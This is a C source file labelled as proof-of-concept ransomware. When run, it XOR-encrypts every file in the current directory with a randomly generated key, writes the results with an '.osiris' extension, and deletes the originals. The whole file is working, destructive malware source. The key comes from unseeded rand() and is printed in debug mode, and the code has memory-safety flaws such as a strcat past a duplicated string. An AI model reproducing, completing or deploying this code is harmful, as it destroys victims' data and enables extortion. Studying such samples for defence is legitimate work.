/*
 * PoC Ransomware
 * Copyright (C) 2019 Abdullah Joseph (afjoseph)
 */
/**********************************************************************************************************************/

#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

/* This is the new extension of a "ransomed" file */
#define RANSOMED_EXT ".osiris"
#define CHARSET "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
#define KEY_LEN 32

#define DBG

/* Count of crypted files */
/*static int Enc_Files = 0;*/

/* never displayed msg */
const char *never_displayed = "Randomware by [afjoseph]";

void rand_str(char *dest, size_t size) {
    for (size_t n = 0; n < size; n++) {
        int key = rand() % (int)(sizeof CHARSET - 1);
        dest[n] = CHARSET[key];
    }
    dest[size] = '\0';
}

void encrypt_block(uint8_t *ret_char, uint8_t char_to_xor, int counter,
                   const uint8_t *key, size_t len_key) {
    uint8_t key_char = key[counter % len_key];
    *ret_char = char_to_xor ^ key_char;

#ifdef DBG
    printf("counter     = %d\n", counter);
    printf("key_char    = 0x%02x\n", key_char);
    printf("byte_to_xor = 0x%02x\n", char_to_xor);
    printf("ret_char    = 0x%02x\n", *ret_char);
#endif
}

int is_filename_proper(const char *filename) {
    // Don't iterate over dots
    if (strcmp(".", filename) == 0 || strcmp("..", filename) == 0) {
        return 1;
    }

    // Don't delete yourself or already encrypted files
    if (strstr(filename, "randomware") != 0 ||
        strstr(filename, ".osiris") != 0) {
        return 1;
    }

    return 0;
}

void encrypt_file(const char *orig_filepath, const uint8_t *key,
                  size_t len_key) {
    char *bname;
    char *new_filepath;
    int origfile_fd, newfile_fd;
    struct stat st;
    int i;
    uint8_t *mem, *newmem;

    bname = basename((char *)orig_filepath);

    if (is_filename_proper(bname) != 0) {
        return;
    }

    if ((origfile_fd = open(orig_filepath, O_RDONLY)) < 0) {
        fprintf(stderr, "[!] open failed %s\n", orig_filepath);
        return;
    }

    if (fstat(origfile_fd, &st) < 0) {
        fprintf(stderr, "[!] fstat failed %s\n", orig_filepath);
        return;
    }

    // Open new file for writing
    new_filepath = strdup(orig_filepath);
    strcat(new_filepath, RANSOMED_EXT);
#ifdef DBG
    printf("new filepath: %s\n", new_filepath);
#endif

    if ((newfile_fd = open(new_filepath, O_WRONLY | O_CREAT | O_TRUNC)) < 0) {
        fprintf(stderr, "[!] open failed %s\n", new_filepath);
        return;
    }

    fchmod(newfile_fd, st.st_mode);  // Don't handle error

    // Copy memory
    mem = (uint8_t *)mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, origfile_fd,
                          0);
    if (mem == MAP_FAILED) {
        fprintf(stderr, "[!] mmap failed\b");
        return;
    }

    newmem = (uint8_t *)alloca(st.st_size);

#ifdef DBG
    printf("\torig_filepath: %s\n", orig_filepath);
    printf("\tsize of file %ld\n", st.st_size);
    printf("\tfirst 4 bytes:\n");
    for (i = 0; i < 4; i++) {
        printf("\t%d: %02x\n", i, mem[i]);
    }

    printf("\tLast byte:\n");
    printf("\t%ld: %02x\n", st.st_size, mem[st.st_size - 2]);
    printf("\n");
#endif

    for (i = 0; i < st.st_size; i++) {
        encrypt_block(&newmem[i], mem[i], i, key, len_key);
#ifdef DBG
        printf("\rprogress: %ld\r", (i / st.st_size) * 100);
#endif
    }

    if ((write(newfile_fd, newmem, st.st_size)) <= 0) {
        fprintf(stderr, "[!] write failed %s", new_filepath);
        return;
    }

    remove(orig_filepath);  // Don't handle any errors

    close(newfile_fd);
    close(origfile_fd);
}

int main(int argc, char **argv) {
    DIR *d;
    struct dirent *dir;
    char *key;

    key = (char *) alloca(KEY_LEN * sizeof(char));
    rand_str(key, KEY_LEN);

#ifdef DBG
    printf("key is: %s\n", key);
#endif

    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            encrypt_file(dir->d_name, (const uint8_t *)key, KEY_LEN);
        }

        closedir(d);
    }
}
